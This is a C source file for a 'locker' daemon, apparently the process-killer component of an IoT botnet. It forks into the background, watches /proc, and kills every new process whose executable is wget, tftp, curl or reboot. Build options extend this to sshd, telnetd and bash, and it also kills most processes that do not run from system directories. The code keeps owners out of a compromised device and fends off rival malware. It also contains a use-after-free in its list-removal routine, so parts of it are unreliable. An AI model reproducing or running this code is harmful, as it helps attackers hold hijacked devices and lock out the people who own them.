#include <time.h>
#include <wait.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <dirent.h>
#include <unistd.h>

#define USLEEP_TIME 1000
#define RESCAN_TIME 1024

int scan_times = 0;

char buf[256] = {0};

typedef struct lock_t {
    int val;

    struct lock_t *prev, *next;
} Lock;

Lock *list_head = NULL;

Lock *append_list(int val) {
    Lock *last = list_head, *node = calloc(1, sizeof(Lock));

    node->val = val;
    node->next = NULL;

    if(list_head == NULL) {
        node->prev = NULL;
        list_head = node;

        return list_head;
    }

    while(last->next != NULL)
        last = last->next;
    
    last->next = node;
    node->prev = last;

    return node;
}

int find_node(int val) {
    Lock *node = list_head;

    while(node != NULL) {
        if(node->val == val)
             return 1;
        
        node = node->next;
    }

    return 0;
}

Lock *remove_list(Lock *del) {
    Lock *ret;

    if(list_head == NULL || del == NULL) //dont wanna fuck with null shit
        return NULL;
    
    if(del == list_head) { //if we are deleting our header structure
        list_head = list_head->next; //set our header structure to the structure after header

        list_head->prev = NULL; //set the new header to null
    }
    else
        del->prev->next = del->next; //move the deleted nodes next one to the structure after
    
    free(del);

    ret = del->next; //return the new current node

    return ret;
}

void remove_all() {
    Lock *last_node = list_head;

    while(last_node->next != NULL)
        last_node = last_node->next;

    while(last_node->prev != NULL) {
        remove_list(last_node);

        last_node = last_node->prev;
    }
}

int check_whitelist(char *pid) {
    char path[64];
    
    strcpy(path, "/proc/");
    strcat(path, pid);
    strcat(path, "/exe");

    if(readlink(path, buf, 255) < 1) {
#ifdef PRINT_ERR
        printf("[locker] error reading: [%s], not killings\n", pid);
#endif
        return 1;
    }

    if(strstr(buf, "/wget") ||
       strstr(buf, "/tftp") || 
       strstr(buf, "/curl") ||
       strstr(buf, "/reboot"))
        return 0;

#ifdef KILL_SESSION
    else if(strstr(buf, "/sshd") || 
            strstr(buf, "/telnetd"))
        return 0;
#endif

#ifdef KILL_BASH
    if(strstr(buf, "/bash"))
        return 0;
#endif

    if(strstr(buf, "lib/") || 
       strstr(buf, "bin/"))
        return 1;

    return 0;
}

Lock *scan() {
    Lock *node;
    struct dirent *files;
    DIR *proc;

    int pid;

    scan_times = 0;

    if(list_head != NULL)
        remove_all();

    if((proc = opendir("/proc/")) == NULL)
        return NULL;

    while((files = readdir(proc))) {
        if((pid = atoi(files->d_name)) < 10)
            continue;
        
        node = append_list(pid);
    }

    closedir(proc);
    return node;    
}

void locker() {
    if(fork() > 0)
        return;
    
    DIR *proc;
    struct dirent *files;

    if((proc = opendir("/proc/")) == NULL)
        return;
    
#ifdef SLEEP
    sleep(1);
#endif

    Lock *node = scan();
#ifdef SCAN_DEBUG
    printf("[locker] highest pid: [%d]\n", node->val);
#endif
    
    while(1) {
#ifdef CLOCK
        clock_t start = clock();
#endif
        while((files = readdir(proc))) {
            if(node->val < atoi(files->d_name)) {

                if(check_whitelist(files->d_name)) {
                    memset(buf, 0, 256);

                    continue;
                }

#ifdef PRINT_PATH
                printf("[locker] killing: [%s] [%s]\n", files->d_name, buf);
#endif
                kill(atoi(files->d_name), 9);
                memset(buf, 0, 256);
            }
        }

        if(scan_times++ > RESCAN_TIME) {
            node = scan();
#ifdef SCAN_DEBUG
            printf("[locker] rescanned new highest pid: [%d]\n", node->val);
#endif
        }

        rewinddir(proc);

#ifdef CLOCK
        double total = (double)(clock() - start) / CLOCKS_PER_SEC;
        printf("[locker] finished in [%f]\n", total);
#endif

#ifdef SLEEP
        sleep(1);
#else
        usleep(USLEEP_TIME);
#endif
    }
}

int main() {
    locker();
}
